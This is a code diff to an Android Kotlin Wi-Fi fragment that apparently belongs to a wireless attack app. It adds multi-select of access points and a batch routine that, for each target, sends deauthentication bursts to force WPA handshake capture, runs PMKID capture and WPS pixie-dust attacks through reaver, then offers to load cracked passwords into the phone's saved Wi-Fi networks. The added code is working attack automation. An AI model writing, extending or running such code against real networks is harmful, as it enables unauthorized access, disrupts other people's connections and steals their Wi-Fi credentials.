@@ -71,6 +71,10 @@ class WifiFragment : Fragment() {
     private var airodump: Airodump? = null
     private var poller: Thread? = null
     private val attackRunning = AtomicBoolean(false)
+    private var selectMode = false
+    private val selected = LinkedHashSet<String>()
+    private lateinit var selectBtn: Button
+    private lateinit var libraryBtn: Button
 
     /** Import a wordlist file the user picks into the app's wordlist store. */
     private val importWordlist = registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
@@ -99,7 +103,10 @@ class WifiFragment : Fragment() {
         status = view.findViewById(R.id.wifi_status)
         list = view.findViewById(R.id.wifi_list)
         view.findViewById<Button>(R.id.wifi_refresh).setOnClickListener { refreshIfaces() }
-        view.findViewById<Button>(R.id.wifi_library).setOnClickListener { openLibrary() }
+        selectBtn = view.findViewById(R.id.wifi_select)
+        libraryBtn = view.findViewById(R.id.wifi_library)
+        selectBtn.setOnClickListener { onSelectBtn() }
+        libraryBtn.setOnClickListener { if (selectMode) exitSelect() else openLibrary() }
         monBtn.setOnClickListener { toggleMonitor() }
         scanBtn.setOnClickListener { if (scanning) stop() else start() }
         Thread { tools.ensure() }.start()
@@ -314,12 +321,106 @@ class WifiFragment : Fragment() {
         context.theme.resolveAttribute(android.R.attr.selectableItemBackground, tv, true)
         setBackgroundResource(tv.resourceId)
         isClickable = true; isLongClickable = true
-        text = if (expanded.contains(ap.bssid)) detail(ap) else summary(ap)
+        text = rowText(ap)
         setOnClickListener {
-            if (!expanded.add(ap.bssid)) expanded.remove(ap.bssid)
-            text = if (expanded.contains(ap.bssid)) detail(ap) else summary(ap)
+            if (selectMode) {
+                if (!selected.add(ap.bssid)) selected.remove(ap.bssid)
+                updateSelectUi()
+            } else {
+                if (!expanded.add(ap.bssid)) expanded.remove(ap.bssid)
+            }
+            text = rowText(ap)
         }
-        setOnLongClickListener { actions(ap); true }
+        setOnLongClickListener { if (!selectMode) actions(ap); true }
+    }
+
+    /** Row text: a ☑/☐ marker in select mode, otherwise the summary or expanded detail. */
+    private fun rowText(ap: Ap): CharSequence {
+        if (selectMode) {
+            val mark = if (selected.contains(ap.bssid)) "☑ " else "☐ "
+            return android.text.TextUtils.concat(mark, summary(ap))
+        }
+        return if (expanded.contains(ap.bssid)) detail(ap) else summary(ap)
+    }
+
+    // ---- multi-select + attack sequence ---------------------------------------
+
+    private fun onSelectBtn() {
+        when {
+            !selectMode -> { selectMode = true; selected.clear(); updateSelectUi(); render() }
+            selected.isEmpty() -> exitSelect()
+            else -> chooseSequenceAttacks()
+        }
+    }
+
+    private fun exitSelect() { selectMode = false; selected.clear(); updateSelectUi(); render() }
+
+    private fun updateSelectUi() {
+        selectBtn.text = when {
+            !selectMode -> "Multi-select"
+            selected.isEmpty() -> "Cancel select"
+            else -> "Run (${selected.size}) ▸"
+        }
+        libraryBtn.text = if (selectMode) "Cancel" else "Saved · wordlists"
+    }
+
+    private fun chooseSequenceAttacks() {
+        val mon = monitorIface ?: run { status.text = "Enable monitor first."; return }
+        val targets = aps.values.filter { selected.contains(it.bssid) }
+        if (targets.isEmpty()) return
+        val sets = arrayOf(
+            "WPA handshake capture",
+            "WPS pixie-dust",
+            "WPA + WPS",
+            "All (handshake + PMKID + WPS)",
+        )
+        MaterialAlertDialogBuilder(requireContext())
+            .setTitle("Run on ${targets.size} AP(s)")
+            .setItems(sets) { _, which ->
+                val wpa = which == 0 || which == 2 || which == 3
+                val wps = which == 1 || which == 2 || which == 3
+                val pmkid = which == 3
+                selectMode = false; selected.clear(); updateSelectUi()
+                runSequence(mon, targets, wpa, pmkid, wps)
+            }
+            .show()
+    }
+
+    /** Run the chosen attack set across [targets] in sequence, respecting each AP's
+     *  eligibility, streaming everything into one inline log. */
+    private fun runSequence(mon: String, targets: List<Ap>, wpa: Boolean, pmkid: Boolean, wps: Boolean) {
+        runAttackInline(
+            "Sequence — ${targets.size} AP(s)", "seq.log",
+            kill = listOf("airodump-ng", "aireplay-ng", "reaver", "aircrack-ng", "hcxdumptool")
+        ) { out, running ->
+            for (ap in targets) {
+                if (!running.get()) break
+                val isWpa = ap.enc.startsWith("WPA")
+                tools.appendLog(out, "\n==== ${ap.name()}  ${ap.bssid}  ${ap.protoLabel()} ====\n")
+                if (wpa && isWpa && running.get()) {
+                    tools.appendLog(out, "-- WPA handshake --\n")
+                    val ad = Airodump(tools, mon, ap.channel.takeIf { it > 0 }, ap.bssid, prefix = "hs")
+                    ad.start()
+                    var got: Boolean? = false
+                    val dl = System.currentTimeMillis() + 60_000
+                    while (running.get() && System.currentTimeMillis() < dl) {
+                        tools.deauth(mon, ap.bssid, ap.clients.keys.firstOrNull(), bursts = 3)
+                        got = tools.hasHandshake(ad.capPath(), ap.bssid)
+                        if (got == true) break
+                        try { Thread.sleep(4000) } catch (_: InterruptedException) { break }
+                    }
+                    ad.stop()
+                    tools.appendLog(out, if (got == true) "handshake captured: ${ad.capPath()}\n" else "no handshake\n")
+                }
+                if (pmkid && isWpa && running.get()) {
+                    tools.appendLog(out, "-- PMKID --\n"); tools.pmkid(mon, ap.bssid, ap.channel, secs = 20, out = out)
+                }
+                if (wps && ap.wps && running.get()) {
+                    tools.appendLog(out, "-- WPS pixie-dust --\n"); tools.wps(mon, ap.bssid, ap.channel, pixie = true, secs = 120, out = out)
+                }
+            }
+            "Sequence complete across ${targets.size} AP(s)."
+        }
     }
 
     private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()
@@ -607,6 +708,12 @@ class WifiFragment : Fragment() {
         })
         head("Cracked passwords")
         mono(cracked)
+        if (tools.crackedEntries().isNotEmpty()) {
+            root.addView(Button(requireContext()).apply {
+                text = "Add cracked to Android Wi-Fi"
+                setOnClickListener { exportToAndroidWifi() }
+            })
+        }
         head("Saved handshakes (${caps.size})")
         if (caps.isEmpty()) mono("(none — capture a handshake first)")
         for (cap in caps) {
@@ -626,6 +733,27 @@ class WifiFragment : Fragment() {
                 Thread { val m = tools.cleanLeftovers(); if (isAdded) status.post { if (isAdded) status.text = m } }.start()
             }
             .show()
+    }
+
+    /** Hand the cracked networks to Android's own "add these Wi-Fi networks?" system dialog
+     *  (Settings.ACTION_WIFI_ADD_NETWORKS, API 30+), so they land in saved Wi-Fi. */
+    private fun exportToAndroidWifi() {
+        if (android.os.Build.VERSION.SDK_INT < 30) {
+            status.text = "Android Wi-Fi import needs Android 11+."; return
+        }
+        val entries = tools.crackedEntries()
+        if (entries.isEmpty()) { status.text = "No cracked passwords to export."; return }
+        val suggestions = ArrayList<android.net.wifi.WifiNetworkSuggestion>()
+        for ((ssid, key) in entries) {
+            suggestions.add(
+                android.net.wifi.WifiNetworkSuggestion.Builder()
+                    .setSsid(ssid).setWpa2Passphrase(key).build()
+            )
+        }
+        val intent = android.content.Intent(android.provider.Settings.ACTION_WIFI_ADD_NETWORKS)
+            .putParcelableArrayListExtra(android.provider.Settings.EXTRA_WIFI_NETWORK_LIST, suggestions)
+        runCatching { startActivity(intent) }
+            .onFailure { status.text = "Could not open Android Wi-Fi import: ${it.message}" }
     }
 
     private fun pickWordlistThen(action: (String) -> Unit) {
